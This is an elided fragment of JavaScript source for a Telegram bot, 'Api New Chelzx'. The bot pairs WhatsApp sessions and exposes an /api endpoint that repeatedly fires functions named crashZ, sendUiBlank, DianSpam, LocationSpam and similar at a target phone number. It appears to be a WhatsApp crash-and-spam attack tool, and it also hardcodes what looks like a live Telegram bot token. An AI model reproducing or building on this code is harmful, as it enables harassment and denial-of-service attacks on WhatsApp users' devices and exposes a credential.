...
const BOT_TOKEN = "8472985614:AAGtUI4yotIHzQvAEnfOrFKfcXMN5BKZE-E";
...
\`\`\``,
      ...
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sockLocal.requestPairingCode(botNumber, "CHELZDEV");
  ...
  try {
    ...
    if (['owner_menu', 'api_menu', 'account_menu', 'akses_menu', 'back_to_main', 'open_accounts_create', 'open_accounts_manage', 'open_accounts_delete'].includes(data)) {
      ...
      if (data === 'owner_menu') {
        caption = escapeMd(`
ꕥ D A T A  B O T ꕥ
ꕤ Developer : @inichelzyaw
ꕤ Name bot : Api New Chelzx
ꕤ Version : 1.0
...
ꕤ Version : 1.0
      ...
      if (data === 'open_accounts_manage') {
        ...
        await bot.answerCallbackQuery(query.id);
        return bot.sendPhoto(chatId, 'https://files.catbox.moe/4n5f63.jpg', {
...
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendPhoto(chatId, 'https://files.catbox.moe/4n5f63.jpg', {
    caption: escapeMd(`
ꕥ D A T A  B O T ꕥ
ꕤ Developer : @inichelzyaw
ꕤ Name bot : Api New Chelzx 
...
bot.onText(/\/Xcreate (.+)/, async (msg, match) => {
  ...
  await bot.sendPhoto(chatId, 'https://files.catbox.moe/4n5f63.jpg', {
...
bot.onText(/^\/TestFunc\s+(\d+)\s+([\s\S]+)/i, async (msg, match) => {
  ...
  for (const nomor of targets) {
    try {
      ...
      const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4n5f63.jpg', {
        caption: [
          '```',
          '┏━━━━⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫━━━━━┓',
          '┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...',
...
app.get('/api', async (req, res) => {
    ...
    async function delay(target) {
      for (let i = 0; i <= 40; i++) {
        await HytamJirt(target),
        await sendUiBlank(sock, target),
        await XnXxUi(target,false),
        await angkasaCursor(target),
        await VampireNewUi(target,true),
    ...
    async function blank(target) {
       for (let i = 0; i < 10; i++) {
          await zalthrexhytam(sock, target),
          await sleep(100)
          await blanksistematis(target),
          await sleep(300)
          await ForceOneMsg(target),
          await sleep(500)
          await BlwnkUi(target),
          await sleep(800)
          await BlwnkUi(sock, target),
          await sleep(1000)
          await blanknih(target),
          await sleep(1100)
          await DianSpam(target),
          await sleep(1300)
          await stikerNotif(target),
          await sleep(1600)
          await DevilsProtocolV2(sock, target),
          await sleep(1900)
          await crashZ(target),
          await sleep(2000)
          await Sxsystem(target),
          await sleep(3000)
          await LocationSpam(target),
          await sleep(3200)
          await delay(sock, target),
          await sleep(3300)
      }
    }
    async function dozer(target) {
